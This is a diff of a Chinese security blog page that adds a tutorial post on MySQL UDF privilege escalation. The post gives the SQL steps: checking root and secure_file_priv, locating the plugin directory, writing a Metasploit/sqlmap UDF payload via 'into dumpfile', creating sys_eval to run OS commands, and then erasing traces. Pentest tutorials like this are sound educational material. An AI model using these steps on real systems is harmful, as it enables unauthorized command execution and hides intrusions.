@@ -87,18 +87,20 @@ daovoice('update');
 </script>
 
 
-  <meta name="description" content="没有所谓失败，除非你不再尝试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="风尘孤狼">
-<meta property="og:url" content="https://hzy2003628.top/archives/2023/03/index.html">
+  <meta name="description" content="mysql之udf提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql之udf提权">
+<meta property="og:url" content="https://hzy2003628.top/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="风尘孤狼">
-<meta property="og:description" content="没有所谓失败，除非你不再尝试">
+<meta property="og:description" content="mysql之udf提权">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-07T11:36:39.000Z">
+<meta property="article:modified_time" content="2023-03-07T04:51:06.122Z">
 <meta property="article:author" content="故里">
-<meta property="article:tag" content="博客">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://hzy2003628.top/archives/2023/03/">
+<link rel="canonical" href="https://hzy2003628.top/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -106,14 +108,14 @@ daovoice('update');
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
 
 
-  <title>归档 | 风尘孤狼</title>
+  <title>mysql之udf提权 | 风尘孤狼</title>
   
 
 
@@ -299,83 +301,282 @@ daovoice('update');
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="故里">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mysql之udf提权
+        </h1>
+
+        <div class="post-meta">  
+		 
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-07 19:36:39 / 修改时间：12:51:06" itemprop="dateCreated datePublished" datetime="2023-03-07T19:36:39+08:00">2023-03-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/" class="post-meta-item leancloud_visitors" data-flag-title="mysql之udf提权" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
   
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        
-        <span class="collection-header">很好! 目前共计 94 篇日志。 继续努力。</span>
-      </div>
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <h2 class="collection-header">2023</h2>
+        <p>mysql之udf提权</p>
+<span id="more"></span>
+<h1 id="前言">前言</h1>
+<h2 id="udf简介">UDF简介</h2>
+<p><code>UDF (user defined function)</code>，即用户自定义函数。是通过添加新函数，对<code>MySQL</code>的功能进行扩充，就像使用本地函数如 <code>user()</code> 一样。</p>
+<p>加载<code>udf</code>，示例中文件末为<code>.so</code>，则为<code>linux</code>系统，如果是<code>win</code>，则后缀为<code>dll</code></p>
+<pre><code class="hljs plaintext">CREATE FUNCTION metaphon
+  RETURNS STRING
+  SONAME &#x27;udf_example.so&#x27;;</code></pre>
+<p>查看存在的<code>udf</code></p>
+<pre><code class="hljs plaintext">SELECT * FROM mysql.func;</code></pre>
+<p>删除<code>udf</code></p>
+<pre><code class="hljs plaintext">DROP FUNCTION metaphon;</code></pre>
+<h1 id="提权思路一">提权思路(一)</h1>
+<h2 id="when">When</h2>
+<p>在无<code>web</code>脚本执行权限，但是有<code>mysql root</code>执行的环境下，我们就可以通过<code>into dumpfile</code>函数导入<code>udf.dll</code>进行提权。有<code>web</code>脚本执行权限时，也可以直接上传<code>udf</code>提权脚本，快速搞定。</p>
+<blockquote>
+<p>总结一下就是需要有mysql的root权限，就可以尝试使用UDF提权</p>
+</blockquote>
+<p>这个第一个思路是针对没有web脚本执行的情况下进行的提权</p>
+<p>若不确定是否是root权限可以使用命令查看一下</p>
+<pre><code class="hljs plaintext">select * from mysql.user where user = substring_index(user(), &#x27;@&#x27;, 1)\G;</code></pre>
+<h2 id="what">What</h2>
+<blockquote>
+<h5 id="数据库相关信息">数据库相关信息</h5>
+</blockquote>
+<p>既然使用<code>dumpfile</code>那么<code>secure_file_priv</code>肯定要设置为空的</p>
+<blockquote>
+<p>注意：secure_file_priv的值为NULL或者是存在值是不能利用UDF提权的，只有空值才行</p>
+</blockquote>
+<blockquote>
+<p>在<code>mysql</code>配置文件中改即可</p>
+</blockquote>
+<pre><code class="hljs plaintext">mysql&gt; show variables like &#x27;%secure%&#x27;;   //查看可导出文件位置
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_auth      | OFF   |
+| secure_file_priv |       |
++------------------+-------+
+2 rows in set (0.00 sec)</code></pre>
+<p>确认mysql安装位置</p>
+<pre><code class="hljs plaintext">select @@basedir as basePath from dual ;
+
+show variables like &#x27;%basedir%&#x27;;</code></pre>
+<p>检查系统构架及<code>plugin</code>目录，通过主机版本及架构确认mysql位数来选用udf文件</p>
+<pre><code class="hljs plaintext">mysql&gt; show variables like ’%compile%‘;
++---------------------------+----------------------------------------+
+| Variable_name             | AMD64                                  |
++---------------------------+----------------------------------------+
+| version_compile_machine   | AMD64                                  |
++---------------------------+----------------------------------------+
+| version_compile_os        | Win32                                  |
++---------------------------+----------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<pre><code class="hljs plaintext">show variables like &quot;%plugin%&quot;;
++---------------+----------------------------------------+
+| Variable_name | Value                                  |
++---------------+----------------------------------------+
+| plugin_dir    |C:\phpStudy\MySQL\lib\plugin\           |
++---------------+----------------------------------------+</code></pre>
+<h2 id="提权payload">提权payload</h2>
+<p>提权payload在kali中的msf中就有</p>
+<blockquote>
+<p>/usr/share/metasploit-framework/data/exploits/mysql</p>
+</blockquote>
+<p>sqlmap里面也有</p>
+<blockquote>
+<p>sqlmap\data\udf\mysql</p>
+<p>sqlmap自身UDF文件进行异或加密了，使用sqlmap解密一下再使用</p>
+<p>python extra/cloak/cloak.py -d -i data/udf/mysql/windows/32/lib_mysqludf_sys.dll_</p>
+</blockquote>
+<p>用<code>010editor</code>打开后另存为十六进制文件，然后去掉空格，去掉换行，生成<code>payload</code></p>
+<p>将生成的payload写入到plugin目录下</p>
+<pre><code class="hljs plaintext">select ‘payload’ into dumpfile &#x27;D:/Programs/PHPStudy/MySQL/lib/plugin/udf.dll&#x27;;</code></pre>
+<p>查看数据库版本，判断udf文件写入位置</p>
+<pre><code class="hljs plaintext">select version();</code></pre>
+<p>注意:mysql自身版本特性，我们将payload是要放在mysql的检索目录中，但是由于版本特性不同，目录也有所不同</p>
+<pre><code class="hljs plaintext">1、 Mysql &lt; 5.0
+导出路径随意。
+
+2、 5.0 &lt;= Mysql &lt; 5.1
+Win2000导出路径： C:/Winnt/udf.dll
+
+其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll
+
+3、 Mysql &gt;= 5.1
+Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。
+
+##有web脚本执行权限的时候，可以直接上传该UDF文件，没有执行权限就提取十六进制这个方法</code></pre>
+<h2 id="调用此提权udf">调用此提权UDF</h2>
+<pre><code class="hljs plaintext">mysql&gt; create function sys_eval returns string soname &#x27;udf.dll&#x27;;
+Query OK, 0 rows affected (0.00 sec)</code></pre>
+<p>此时再去查看存在的UDF就能看到自己上传的这个UDF了</p>
+<pre><code class="hljs plaintext">select * from mysql.func;
+select sys_eval(‘net user’);</code></pre>
+<p>至此就完成了UDF提权</p>
+<h1 id="痕迹清除">痕迹清除</h1>
+<p><strong>删除表</strong></p>
+<pre><code class="hljs plaintext">drop table udf;</code></pre>
+<p><strong>删除函数</strong></p>
+<pre><code class="hljs plaintext">drop function sys_eval;</code></pre>
+<h1 id="补充">补充</h1>
+<p>UDF提权一般仅适用于windows系统，linux系统由于自身对plugin目录严格的写入权限，很难利用</p>
+<p>参考博客链接:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45290991/article/details/115716262">(96条消息) 20210415web渗透学习之Mysqludf提权（二）（胃肠炎住院期间转）_热热的雨夜的博客-CSDN博客</a></p>
+
     </div>
 
-  <article class="my-post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="my-post-header">
-
-      <div class="my-post-meta">
-        <time class="my-post-time" itemprop="dateCreated"
-              datetime="2023-03-07T19:36:39+08:00"
-              content="2023-03-07">
-          03-07
-        </time>
+    
+    
+    
+        <div class="reward-container">
+  <div>制作不易，如若感觉写的不错，欢迎打赏</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="故里 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/zhifubao.jpg" alt="故里 支付宝">
+        <p>支付宝</p>
       </div>
 
-      <h3 class="my-post-title">
-          <a class="my-post-title-link" href="/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/" itemprop="url">
-            
-              <span itemprop="name">mysql之udf提权</span>
-            
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-  <article class="my-post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="my-post-header">
-
-      <div class="my-post-meta">
-        <time class="my-post-time" itemprop="dateCreated"
-              datetime="2023-03-04T22:39:55+08:00"
-              content="2023-03-04">
-          03-04
-        </time>
-      </div>
-
-      <h3 class="my-post-title">
-          <a class="my-post-title-link" href="/2023/03/04/%E5%85%AC%E5%AE%89/" itemprop="url">
-            
-              <span itemprop="name">黄河流域公安院校网络空间安全技能挑战赛-WEB部分</span>
-            
-          </a>
-      </h3>
-
-    </header>
-  </article>
-
-
-    </div>
   </div>
-  
-  
-  
+</div>
 
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>故里
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzy2003628.top/2023/03/07/mysql%E4%B9%8Budf%E6%8F%90%E6%9D%83/" title="mysql之udf提权">https://hzy2003628.top/2023/03/07/mysql之udf提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          </div>
+
+        
+
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/04/%E5%85%AC%E5%AE%89/" rel="prev" title="黄河流域公安院校网络空间安全技能挑战赛-WEB部分">
+      <i class="fa fa-chevron-left"></i> 黄河流域公安院校网络空间安全技能挑战赛-WEB部分
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
   
-
-
+  
+  
 
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -425,6 +626,7 @@ daovoice('update');
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#udf%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">UDF简介</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="nav-number">2.</span> <span class="nav-text">提权思路(一)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#when"><span class="nav-number">2.1.</span> <span class="nav-text">When</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#what"><span class="nav-number">2.2.</span> <span class="nav-text">What</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="nav-number">2.2.0.0.1.</span> <span class="nav-text">数据库相关信息</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83payload"><span class="nav-number">2.3.</span> <span class="nav-text">提权payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%AD%A4%E6%8F%90%E6%9D%83udf"><span class="nav-number">2.4.</span> <span class="nav-text">调用此提权UDF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="nav-number">3.</span> <span class="nav-text">痕迹清除</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">4.</span> <span class="nav-text">补充</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
